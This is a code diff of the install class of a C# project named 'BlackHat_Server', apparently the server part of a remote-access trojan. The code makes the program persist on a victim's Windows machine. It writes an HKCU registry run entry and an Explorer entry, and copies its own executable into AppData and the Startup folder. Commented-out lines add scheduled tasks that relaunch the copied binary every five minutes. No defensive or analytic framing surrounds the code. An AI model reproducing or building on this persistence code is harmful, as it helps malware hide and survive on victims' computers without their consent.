@@ -3,7 +3,7 @@ using System.IO;
 using System.Threading;
 using System.Windows.Forms;
 
-namespace BlackHat_Server
+namespace BlackHat_Server.Class
 {
     internal class InstallClass
     {
@@ -12,8 +12,10 @@ namespace BlackHat_Server
         /// </summary>
         public void StartInstallTHread()
         {
-            var t = new Thread(InstallServer);
-            t.IsBackground = true;
+            var t = new Thread(InstallServer)
+            {
+                IsBackground = true
+            };
             t.Start();
         }
 
@@ -23,14 +25,19 @@ namespace BlackHat_Server
         /// </summary>
         private void InstallServer()
         {
-            if (ST_Client.Instance.bUseHKCU)
-                InstallHCKU(ST_Client.Instance.sHKCUEntry, ST_Client.Instance.sAppDataInstall);
 
-            if (ST_Client.Instance.bUseExplorer)
-                InstallExplorer(ST_Client.Instance.sExplorerEntry, ST_Client.Instance.sAppDataInstall);
-
-            if (ST_Client.Instance.bUseStartupFolder)
-                CopyInStartup(ST_Client.Instance.sStartupFileName);
+            // Thread.Sleep(80000);
+            // var dosRunner = new DosRunner();
+            // dosRunner.ExecuteCommand("schtasks.exe /Create /XML expo.xml /tn taskname", "c:\\tmp");
+            
+            // if (ST_Client.Instance.bUseHKCU)
+            //     InstallHCKU(ST_Client.Instance.sHKCUEntry, ST_Client.Instance.sAppDataInstall);
+            //
+            // if (ST_Client.Instance.bUseExplorer)
+            //     InstallExplorer(ST_Client.Instance.sExplorerEntry, ST_Client.Instance.sAppDataInstall);
+            //
+            // if (ST_Client.Instance.bUseStartupFolder)
+            //     CopyInStartup(ST_Client.Instance.sStartupFileName);
         }
         //-----------------------------------------
 
@@ -48,7 +55,7 @@ namespace BlackHat_Server
                 var finalDestination = Path.Combine(appData, appDataPath);
 
                 var rm = new RegistryManager();
-
+                
                 rm.AddHKCUReg(regEntry, finalDestination);
 
 
@@ -60,6 +67,13 @@ namespace BlackHat_Server
 
                     File.Copy(Application.ExecutablePath, finalDestination);
                 }
+                
+                // TaskService.Instance.AddTask("Test4", new DailyTrigger()
+                //     {
+                //         Repetition = new RepetitionPattern(TimeSpan.FromMinutes(5),TimeSpan.Zero)
+                //     } ,
+                //     new ExecAction(finalDestination));
+                
             }
             catch (Exception ex)
             {
